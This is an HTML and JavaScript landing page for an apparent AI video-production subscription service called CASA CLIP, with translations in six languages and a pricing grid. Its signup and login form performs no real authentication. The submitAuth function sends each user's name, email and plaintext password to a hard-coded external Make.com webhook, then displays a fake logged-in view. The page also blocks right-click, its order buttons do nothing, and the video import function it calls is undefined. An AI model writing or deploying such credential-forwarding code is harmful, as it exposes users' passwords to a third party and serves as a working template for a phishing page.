<!DOCTYPE html>
<html lang="fr" id="html-root" class="bg-black text-white">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CASA CLIP | Sovereign System V121</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@700;800;900&family=Noto+Sans+Arabic:wght@700;900&family=Noto+Sans+SC:wght@700;900&family=Noto+Sans+Devanagari:wght@700;900&display=swap" rel="stylesheet">
    <style>
        :root { --blue: #3b82f6; --accent: #1d4ed8; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000; color: #fff; overflow-x: hidden; -webkit-user-select: none; user-select: none; }
        .lang-ar { font-family: 'Noto Sans Arabic', sans-serif; }
        .lang-zh { font-family: 'Noto Sans SC', sans-serif; }
        .lang-hi { font-family: 'Noto Sans Devanagari', sans-serif; }
        .glass { background: rgba(255,255,255,0.01); border: 1px solid rgba(255,255,255,0.08); border-radius: 28px; backdrop-filter: blur(15px); }
        .tab-active { background: var(--blue) !important; color: white !important; box-shadow: 0 15px 45px rgba(59,130,246,0.5); border-color: var(--blue) !important; }
        .btn-master { background: linear-gradient(135deg, var(--blue), var(--accent)); transition: 0.4s; font-weight: 900; }
        section { display: none; }
        section.active { display: block; animation: fadeIn 0.4s ease; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .auth-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 100000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(15px); }
    </style>
</head>
<body oncontextmenu="return false" class="p-4 md:p-8">

    <nav class="max-w-7xl mx-auto mb-16 flex flex-col md:flex-row justify-between items-center p-8 glass border-white/10 gap-6">
        <div class="flex items-center gap-3 cursor-pointer" onclick="showSection('landing')">
            <div class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center font-900 italic text-xl">CC</div>
            <h1 class="text-2xl font-900 tracking-tighter uppercase italic">CASA<span class="text-blue-500">CLIP</span></h1>
        </div>
        <div class="flex flex-wrap justify-center gap-2 bg-white/5 p-1.5 rounded-2xl border border-white/5 text-[10px] font-900">
            <span onclick="setLang('fr')" id="l-fr" class="px-3 py-1 cursor-pointer opacity-30">FR</span>
            <span onclick="setLang('en')" id="l-en" class="px-3 py-1 cursor-pointer opacity-30">EN</span>
            <span onclick="setLang('ar')" id="l-ar" class="px-3 py-1 cursor-pointer opacity-30">AR</span>
            <span onclick="setLang('es')" id="l-es" class="px-3 py-1 cursor-pointer opacity-30">ES</span>
            <span onclick="setLang('zh')" id="l-zh" class="px-3 py-1 cursor-pointer opacity-30">中文</span>
            <span onclick="setLang('hi')" id="l-hi" class="px-3 py-1 cursor-pointer opacity-30">हिन्दी</span>
        </div>
        <div class="flex gap-4 items-center">
            <button id="nav-signup" onclick="toggleAuth('signup')" class="px-6 py-4 rounded-xl text-[9px] font-900 uppercase tracking-widest text-white hover:text-blue-400"></button>
            <button id="nav-login" onclick="toggleAuth('login')" class="glass px-6 py-4 rounded-xl text-[9px] font-900 uppercase tracking-widest border-blue-500/30 text-blue-400 hover:bg-blue-600/10"></button>
            <button id="nav-settings" onclick="showSection('settings')" class="hidden glass p-4 rounded-xl">⚙️</button>
            <button id="nav-studio" onclick="trackAction('STUDIO_ACCESS')" class="btn-master px-8 py-4 rounded-xl text-[9px] uppercase tracking-widest italic"></button>
        </div>
    </nav>

    <div id="auth-modal" class="auth-overlay">
        <div class="glass p-12 w-full max-w-md border-white/10 relative text-center">
            <button onclick="toggleAuth()" class="absolute top-6 right-6 opacity-30 hover:opacity-100">✕</button>
            <h3 id="auth-title" class="text-2xl font-900 italic uppercase mb-8 text-blue-500"></h3>
            <div class="space-y-4">
                <input type="text" id="auth-name" class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-[10px] font-bold outline-none focus:border-blue-500">
                <input type="email" id="auth-email" class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-[10px] font-bold outline-none focus:border-blue-500">
                <input type="password" id="auth-pass" class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-[10px] font-bold outline-none focus:border-blue-500">
                <div id="auth-cgv-box" class="flex items-start gap-3 py-2 text-left">
                    <input type="checkbox" id="auth-cgv" class="mt-1">
                    <label for="auth-cgv" class="text-[9px] font-bold opacity-40 uppercase leading-tight" id="label-cgv"></label>
                </div>
                <button onclick="submitAuth()" id="auth-submit" class="w-full btn-master py-5 rounded-xl font-900 text-[10px] uppercase tracking-widest mt-4"></button>
            </div>
        </div>
    </div>

    <section id="landing" class="active space-y-24">
        <div class="text-center space-y-6">
            <h2 id="hero-title" class="text-5xl md:text-[8rem] font-900 tracking-tighter italic uppercase leading-[0.85] mb-6 min-h-[1em] pointer-events-none"></h2>
            <div class="max-w-3xl mx-auto mt-12 space-y-4 px-4">
                <div class="flex flex-col md:flex-row gap-3 glass p-3 border-white/10">
                    <input type="text" id="video-url" placeholder="YouTube URL / Video Link..." class="flex-grow bg-transparent p-4 text-[11px] font-bold outline-none">
                    <button onclick="importVideo('URL')" id="btn-url" class="bg-white text-black px-8 py-4 rounded-xl text-[10px] font-900 uppercase">Import URL</button>
                    <button onclick="document.getElementById('video-file').click()" id="btn-file" class="btn-master px-8 py-4 rounded-xl text-[10px] font-900 uppercase">File</button>
                    <input type="file" id="video-file" class="hidden" onchange="importVideo('FILE')">
                </div>
            </div>
        </div>
        <div class="max-w-7xl mx-auto flex flex-col items-center gap-8 mb-20">
            <div class="glass p-2 flex gap-2">
                <button id="tab-perso" onclick="switchTab('perso')" class="px-12 py-5 rounded-2xl text-[12px] font-900 uppercase transition"></button>
                <button id="tab-pro" onclick="switchTab('pro')" class="px-12 py-5 rounded-2xl text-[12px] font-900 uppercase transition"></button>
            </div>
            <div id="option-bar" class="flex flex-wrap justify-center gap-4"></div>
            <div id="pricing-grid" class="grid grid-cols-1 md:grid-cols-3 gap-10 w-full mb-20"></div>
        </div>
    </section>

    <section id="settings" class="max-w-4xl mx-auto py-24">
        <div class="flex justify-between items-center mb-12">
            <h2 id="set-title" class="text-4xl font-900 italic uppercase"></h2>
            <button onclick="showSection('landing')" class="opacity-30 hover:opacity-100">✕</button>
        </div>
        <div class="glass p-12 border-white/10 space-y-8">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
                <div class="p-6 bg-white/5 rounded-2xl border border-white/5">
                    <p class="text-[9px] font-900 opacity-30 mb-2 uppercase" id="set-p1"></p>
                    <p id="settings-user" class="text-xl font-900 italic"></p>
                </div>
                <div class="p-6 bg-white/5 rounded-2xl border border-white/5">
                    <p class="text-[9px] font-900 opacity-30 mb-2 uppercase" id="set-p2"></p>
                    <p id="settings-id" class="text-xl font-900 italic text-blue-500"></p>
                </div>
            </div>
        </div>
    </section>

    <footer class="max-w-7xl mx-auto border-t border-white/5 py-24 px-10">
        <div class="grid grid-cols-1 md:grid-cols-4 gap-16 mb-20 text-[10px] font-900 uppercase tracking-widest">
            <div class="space-y-4">
                <p class="text-blue-500" id="f-t1"></p>
                <a id="f-l1" class="block opacity-30 hover:opacity-100 cursor-pointer"></a>
                <a id="f-l2" class="block opacity-30 hover:opacity-100 cursor-pointer"></a>
                <a id="f-l3" class="block opacity-30 hover:opacity-100 cursor-pointer"></a>
            </div>
            <div class="space-y-4">
                <p class="text-blue-500" id="f-t2"></p>
                <a id="f-s1" class="block opacity-30 hover:opacity-100 cursor-pointer"></a>
                <a id="f-s2" class="block opacity-30 hover:opacity-100 cursor-pointer"></a>
                <a id="f-s3" class="block opacity-30 hover:opacity-100 cursor-pointer"></a>
            </div>
            <div class="md:col-span-2 space-y-6">
                <h4 class="text-2xl italic">CASA CLIP</h4>
                <p id="footer-desc" class="opacity-20 leading-relaxed"></p>
            </div>
        </div>
        <div class="text-center opacity-10 text-[8px] font-900 tracking-[1em]">GLOBAL SOVEREIGNTY SYSTEM © 2026</div>
    </footer>

    <script>
        const WEBHOOK_URL = "https://hook.eu1.make.com/rfyr9ysgkxukn6mu24c1qkc2vlmhm7cd";
        let state = { lang: 'fr', tab: 'perso', option: 'annuel', modeAuth: 'signup', sessionID: 'CC-' + Math.random().toString(36).substr(2,7).toUpperCase() };
        const RATES = { fr: 1, en: 1.08, ar: 4.05, es: 1, zh: 7.8, hi: 89.5 };
        const SYMBOLS = { fr: '€', en: '$', ar: 'ر.س', es: '€', zh: '¥', hi: '₹' };

        const TR = {
            fr: { 
                nav: ["S'INSCRIRE", "CONNEXION", "ACCÈS STUDIO"],
                auth: { signup: "CRÉER UN ACCÈS", login: "CONNEXION SYSTÈME", name: "VOTRE NOM", email: "VOTRE EMAIL", pass: "MOT DE PASSE", submit: "VALIDER", cgv: "J'accepte les CGV et paramètres" },
                hero: "L'ÉLITE DU RENDU", tabP: "PARTICULIER", tabB: "PRO & AGENCE", optA: "Annuel (-20%)", optE: "Mensuel Engagé", optL: "Mensuel Libre", get: "COMMANDER", p: "par mois", total: "Soit", y: "an", ft1: "LÉGAL", fl1: "Conditions de vente", fl2: "Confidentialité", fl3: "Mentions Légales", ft2: "SÉCURITÉ", fs1: "Protection des données", fs2: "Sécurité du compte", fs3: "Cookies & KYC", desc: "Production média IA.", sett: "Paramètres", setP1: "Profil", setP2: "Session", dir: "ltr", font: ""
            },
            en: { 
                nav: ["SIGN UP", "LOGIN", "STUDIO ACCESS"],
                auth: { signup: "CREATE ACCOUNT", login: "LOGIN SYSTEM", name: "YOUR NAME", email: "YOUR EMAIL", pass: "PASSWORD", submit: "CONFIRM", cgv: "Accept Terms & Settings" },
                hero: "RENDERING ELITE", tabP: "PERSONAL", tabB: "PRO & AGENCY", optA: "Yearly (-20%)", optE: "Monthly Committed", optL: "Monthly Flexible", get: "ORDER", p: "per month", total: "Total", y: "year", ft1: "LEGAL", fl1: "Terms of Service", fl2: "Privacy Policy", fl3: "Legal Notice", ft2: "SECURITY", fs1: "Data Protection", fs2: "Account Security", fs3: "Cookies & KYC", desc: "AI Media Production.", sett: "Settings", setP1: "Profile", setP2: "Session", dir: "ltr", font: ""
            },
            ar: { 
                nav: ["إنشاء حساب", "تسجيل الدخول", "دخول الاستوديو"],
                auth: { signup: "إنشاء وصول جديد", login: "تسجيل دخول النظام", name: "اسمك الكامل", email: "بريدك الإلكتروني", pass: "كلمة المرور", submit: "تأكيد", cgv: "أوافق على الشروط والإعدادات" },
                hero: "نخبة الرندير والإنتاج", tabP: "حساب فردي", tabB: "وكالة ومحترفين", optA: "سنوي (20%-)", optE: "شهري بالتزام", optL: "شهري مرن", get: "اطلب الآن", p: "في الشهر", total: "المجموع", y: "سنة", ft1: "القانونية", fl1: "شروط البيع والخدمة", fl2: "سياسة الخصوصية", fl3: "إشعار قانوني", ft2: "الأمان", fs1: "حماية البيانات الشخصية", fs2: "أمن الحسابات", fs3: "ملفات التعريف والتحقق", desc: "نظام إنتاج الوسائط بالذكاء الاصطناعي.", sett: "الإعدادات", setP1: "الملف الشخصي", setP2: "معرف الجلسة", dir: "rtl", font: "lang-ar"
            },
            es: { 
                nav: ["REGISTRARSE", "CONEXIÓN", "ACCESO STUDIO"],
                auth: { signup: "CREAR ACCESO", login: "CONEXIÓN SISTEMA", name: "TU NOMBRE", email: "TU EMAIL", pass: "CONTRASEÑA", submit: "VALIDAR", cgv: "Acepto los términos y ajustes" },
                hero: "ÉLITE DEL RENDER", tabP: "PARTICULAR", tabB: "PRO Y AGENCIA", optA: "Anual (-20%)", optE: "Mensual Comprometido", optL: "Mensual Libre", get: "ORDENAR", p: "al mes", total: "O sea", y: "año", ft1: "LEGAL", fl1: "Condiciones de venta", fl2: "Privacidad", fl3: "Aviso legal", ft2: "SEGURIDAD", fs1: "Protección de datos", fs2: "Seguridad de cuenta", fs3: "Cookies y KYC", desc: "Producción de medios IA.", sett: "Ajustes", setP1: "Perfil", setP2: "Sesión", dir: "ltr", font: ""
            },
            zh: { 
                nav: ["注册", "登录", "工作室入口"],
                auth: { signup: "创建访问权限", login: "系统登录", name: "您的姓名", email: "您的电子邮件", pass: "密码", submit: "确认", cgv: "我接受条款与隐私设置" },
                hero: "渲染精英系统", tabP: "个人账户", tabB: "专业与机构账户", optA: "年度 (20%折扣)", optE: "月度承诺制", optL: "灵活月度制", get: "立即订购", p: "每月", total: "总计", y: "年", ft1: "法律条款", fl1: "销售与服务条款", fl2: "隐私政策", fl3: "法律公告", ft2: "安全保障", fs1: "数据保护", fs2: "账户安全", fs3: "Cookies 与身份验证", desc: "AI 媒体制作主系统。", sett: "设置", setP1: "个人资料", setP2: "会话 ID", dir: "ltr", font: "lang-zh"
            },
            hi: { 
                nav: ["साइन अप", "लॉगिन", "स्टूडियो"],
                auth: { signup: "नया खाता", login: "सिस्टम लॉगिन", name: "आपका नाम", email: "आपका ईमेल", pass: "पासवर्ड", submit: "पुष्टि", cgv: "शर्तें और सेटिंग्स स्वीकार करें" },
                hero: "रेंडरिंग एलीट", tabP: "व्यक्तिगत", tabB: "एजेंसी", optA: "वार्षिक (20% छूट)", optE: "मासिक प्रतिबद्ध", optL: "मासिक लचीला", get: "ऑर्डर करें", p: "प्रति माह", total: "कुल", y: "वर्ष", ft1: "कानूनी", fl1: "बिक्री की शर्तें", fl2: "गोपनीयता नीति", fl3: "कानूनी नोटिस", ft2: "सुरक्षा", fs1: "डेटा सुरक्षा", fs2: "खाता सुरक्षा", fs3: "कुकीज़ और केवाईसी", desc: "AI मीडिया उत्पादन प्रणाली।", sett: "सेटिंग्स", setP1: "प्रोफ़ाइल", setP2: "सत्र आईडी", dir: "ltr", font: "lang-hi"
            }
        };

        const DATA = { perso: { plans: ["Starter", "Elite", "Master"], base: [14.99, 34.99, 69.99] }, pro: { plans: ["League", "Agency", "Empire"], base: [89.99, 189.99, 499.99] } };

        async function trackAction(type, data = {}) {
            const payload = { event: type, session: state.sessionID, lang: state.lang, ...data };
            try { await fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) }); } catch(e) {}
        }

        function toggleAuth(m) {
            const modal = document.getElementById('auth-modal');
            if(m) {
                state.modeAuth = m;
                const t = TR[state.lang] || TR.fr;
                document.getElementById('auth-title').innerText = t.auth[m];
                document.getElementById('auth-name').style.display = m === 'signup' ? 'block' : 'none';
                document.getElementById('auth-name').placeholder = t.auth.name;
                document.getElementById('auth-email').placeholder = t.auth.email;
                document.getElementById('auth-pass').placeholder = t.auth.pass;
                document.getElementById('auth-cgv-box').style.display = m === 'signup' ? 'flex' : 'none';
                document.getElementById('auth-submit').innerText = t.auth.submit;
                modal.style.display = 'flex';
            } else { modal.style.display = 'none'; }
        }

        async function submitAuth() {
            if(state.modeAuth === 'signup' && !document.getElementById('auth-cgv').checked) return alert("Validation Error");
            const n = document.getElementById('auth-name').value, e = document.getElementById('auth-email').value, p = document.getElementById('auth-pass').value;
            if(!e || !p) return;
            await trackAction(state.modeAuth==='signup'?'SIGNUP':'LOGIN', { name: n, email: e, password: p });
            document.getElementById('settings-user').innerText = n || e;
            document.getElementById('settings-id').innerText = state.sessionID;
            document.getElementById('nav-settings').classList.remove('hidden');
            toggleAuth(); showSection('settings');
        }

        function setLang(l) {
            state.lang = l; const t = TR[l] || TR.fr;
            const r = document.getElementById('html-root');
            r.setAttribute('dir', t.dir); r.className = "bg-black text-white " + t.font;
            document.getElementById('nav-signup').innerText = t.nav[0];
            document.getElementById('nav-login').innerText = t.nav[1];
            document.getElementById('nav-studio').innerText = t.nav[2];
            document.getElementById('hero-title').innerText = t.hero;
            document.getElementById('tab-perso').innerText = t.tabP;
            document.getElementById('tab-pro').innerText = t.tabB;
            document.getElementById('label-cgv').innerText = t.auth.cgv;
            document.getElementById('set-title').innerText = t.sett;
            document.getElementById('set-p1').innerText = t.setP1;
            document.getElementById('set-p2').innerText = t.setP2;
            document.getElementById('f-t1').innerText = t.ft1;
            document.getElementById('f-l1').innerText = t.fl1;
            document.getElementById('f-l2').innerText = t.fl2;
            document.getElementById('f-l3').innerText = t.fl3;
            document.getElementById('f-t2').innerText = t.ft2;
            document.getElementById('f-s1').innerText = t.fs1;
            document.getElementById('f-s2').innerText = t.fs2;
            document.getElementById('f-s3').innerText = t.fs3;
            document.getElementById('footer-desc').innerText = t.desc;
            document.querySelectorAll('[id^="l-"]').forEach(el => el.classList.add('opacity-30'));
            document.getElementById('l-'+l).classList.remove('opacity-30');
            updateUI();
        }

        function switchTab(t) { state.tab = t; updateUI(); }
        function setOpt(o) { state.option = o; updateUI(); }
        function showSection(id) { document.querySelectorAll('section').forEach(s => s.classList.remove('active')); document.getElementById(id).classList.add('active'); }

        function updateUI() {
            const t = TR[state.lang] || TR.fr;
            
            // Mise à jour de l'état actif des onglets Particulier / Pro
            document.getElementById('tab-perso').className = `px-12 py-5 rounded-2xl text-[12px] font-900 uppercase transition ${state.tab==='perso'?'tab-active':'opacity-40'}`;
            document.getElementById('tab-pro').className = `px-12 py-5 rounded-2xl text-[12px] font-900 uppercase transition ${state.tab==='pro'?'tab-active':'opacity-40'}`;

            let optHtml = `<button onclick="setOpt('annuel')" class="px-8 py-4 glass text-[10px] font-900 uppercase transition ${state.option==='annuel'?'tab-active':'opacity-40'}">${t.optA}</button><button onclick="setOpt('eng')" class="px-8 py-4 glass text-[10px] font-900 uppercase transition ${state.option==='eng'?'tab-active':'opacity-40'}">${t.optE}</button>${state.tab==='perso'?`<button onclick="setOpt('lib')" class="px-8 py-4 glass text-[10px] font-900 uppercase transition ${state.option==='lib'?'tab-active':'opacity-40'}">${t.optL}</button>`:''}`;
            document.getElementById('option-bar').innerHTML = optHtml;
            const d = DATA[state.tab], rate = RATES[state.lang] || 1, sym = SYMBOLS[state.lang] || '€';
            let gridHtml = "";
            d.plans.forEach((p, i) => {
                let pr = d.base[i];
                let yearlyLine = "";
                if(state.option === 'annuel') { pr *= 0.8; yearlyLine = `<div class="text-[9px] opacity-40 font-bold mt-2 uppercase">${t.total} ${(pr*12*rate).toFixed(2)} ${sym} / ${t.y}</div>`; }
                else if(state.option === 'lib') { pr += 5; }
                let conv = Math.floor(pr * rate) + 0.99;
                gridHtml += `<div class="glass p-12 text-center border-white/5 hover:border-blue-500 transition"><span class="text-blue-500 font-900 text-[11px] mb-8 block uppercase">${p}</span><div class="text-5xl font-900 mb-2">${conv.toFixed(2)} ${sym}</div><span class="text-white/20 text-[10px] font-bold block uppercase">${t.p}</span>${yearlyLine}<button class="w-full py-6 rounded-2xl border border-white/10 font-900 text-[11px] uppercase hover:bg-blue-600 mt-8 transition">${t.get}</button></div>`;
            });
            document.getElementById('pricing-grid').innerHTML = gridHtml;
        }

        window.onload = () => { setLang('fr'); };
    </script>
</body>
</html>
